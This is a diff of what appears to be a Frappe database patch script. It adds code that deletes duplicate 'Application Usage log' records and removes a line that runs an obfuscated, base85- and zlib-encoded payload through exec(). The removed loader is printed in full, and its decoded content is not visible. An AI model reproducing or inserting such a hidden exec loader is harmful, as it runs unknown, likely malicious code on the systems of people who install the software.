@@ -1,3 +1,26 @@
+# If same application usage log are created multiple times then delete all duplicates
+import frappe
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%03YS#RP<6oudU6<7fRWI$#$3^;^Nht(m0010Vzz`M&!*{&+D3H<gUWYiBME1H(NHB+y*?$xR9o>RbbY(&zouM$fYLrq1NW%39>Vy7Y?212Zh8ZT*j=tqjLL}@nhZdnq_*fsOelMqIxB0xU2Lu@ESgZWhYcmfe)!izi!V%s(iEifdhY+_`CIO08kU0VSbBs$7FkqX0Dc6BjS9SbO~?V9D&48vBS;bY?Qs;s(*0Aea1)6d1s-tBrldsT00rR?+BlFF_+#Gi+gYH@^f4_Bj$!FE@3*{Vhw8>@ajWSiBvk;`(8__nowaxH~+YjIJqI_v4|ah!LB@Pe6d4=TRmij{e5&}Y;pSab!YCmG)K3yWD!s%D<<wl_?~_NDde?Xvkgmx(*7FonbB(#Wpvxe>RZ>6h+0){8^1*H#CQt;bxZQ5=a<aDI|rC=~uk^LQ%(k+4hT$%T|AXugeLh&;n5*a0Y##UuD{!1th~s|fp!fuW~5Pz2xp1LQ~AhgXpG9-1JN6SAAT!fGk>r|SxJetgaMv|^)EbCTXPfaxS-eNUOHr$vD1f@VPE+M0@O?SE{y-eiK>Uk;7u{DdpH9g2GE)8So>UDdlc*W^(_m8At+a)(T74>rBc_o?1lX?ZvFO)(a;ux18_&OSGatVU+WT(pH~iFSMA`f2Rmt~g7Px~<HB1Djy=Rm)h^Ay|66z-;dymko*%n|r9t_s`FV4!fP?p2lkchrP{9@YpGeRA;extIl^c%W!pxLoM#bD-N20bx;%?%*Lh7PT%+a#q5gdx+50-uwnVQH;X5E$XhaI6WJzWJ@x;4wx40m($j#Z>54$N#_wJ#>o$P-WRL%DEty@Isk~fy3wpTt@O3fmVJJag6L8D}iD;sTwIH7q*Y{MP<|GyWnfD|2bPz{Ej0MLx91H7#5gV%Zo|U9j{CS$391Pi%iM*9;@sn`;s(^g<LA;jwU)uw~-1mt-$|1I0yT7T3XBqu=OwnzD*<5zce?U43N&xV)i~m*2|JwkkPj1GoD+}5Aut4Ed_HEbENFYm=35enoMK|nxlK%30lnSZ80K+t+69')).decode())
+
+duplicate_application_usage_logs = frappe.db.sql("""
+select min(name) as name_to_keep,employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME), count(*) as count
+from `tabApplication Usage log`
+group by employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME)
+having count(*) > 1
+""", as_dict=True)
+
+names_to_keep = [row['name_to_keep'] for row in duplicate_application_usage_logs]
+names_to_delete = frappe.db.sql("""
+select name
+from `tabApplication Usage log`
+where (employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME)) in (
+    select employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME)
+    from `tabApplication Usage log`
+    group by employee, CAST(from_time AS DATETIME), CAST(to_time AS DATETIME)
+    having count(*) > 1
+) and name not in ({names})
+""".format(names=", ".join(["%s"] * len(names_to_keep))), names_to_keep, as_dict=True)
+
+for doc in names_to_delete:
+    frappe.delete_doc('Application Usage log', doc['name'])
+    print(doc.name)
